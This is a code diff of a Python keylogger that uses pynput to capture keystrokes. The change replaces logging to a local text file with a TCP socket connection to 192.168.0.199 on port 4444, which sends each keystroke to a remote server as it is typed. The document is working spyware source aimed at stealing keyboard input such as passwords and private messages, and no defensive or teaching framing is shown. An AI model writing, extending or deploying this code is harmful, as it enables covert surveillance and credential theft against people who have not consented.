@@ -1,5 +1,19 @@
 # listener class, monitor keyboard 
 from pynput.keyboard import Listener 
+import socket
+
+IP = "192.168.0.199"
+port = 4444
+address = (IP, port)
+
+try:
+     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     client.connect((address))
+     print(f"Connected to server {IP} on port: {port}")
+	
+except Exception as e:
+
+	print(f"Could not connect to server {e}")
 
 def writetofile(key):
 
@@ -18,21 +32,23 @@ def writetofile(key):
 
 				keystroke = ' '
 		
-		if keystroke == "Key.enter":
+		elif keystroke == "Key.enter":
 
 				keystroke = '\n'
 		
-		if keystroke in keys_to_discard:
+		elif keystroke in keys_to_discard:
 				
 				keystroke = ''
+		
+		if keystroke:
+			
+				byte_msg = keystroke.encode('utf-8')
+			
+				client.sendall(byte_msg)
+		
+	except:
 
-		with open("keylogger.txt", 'a') as f:
-	
-			f.write(keystroke)
-
-	except FileNotFoundError:
-
-		print("File could not be found, make sure the file is present in the working directory")
+		print("Could not connect to the server")
  
 # on_press argument makes the function execute everytime
 
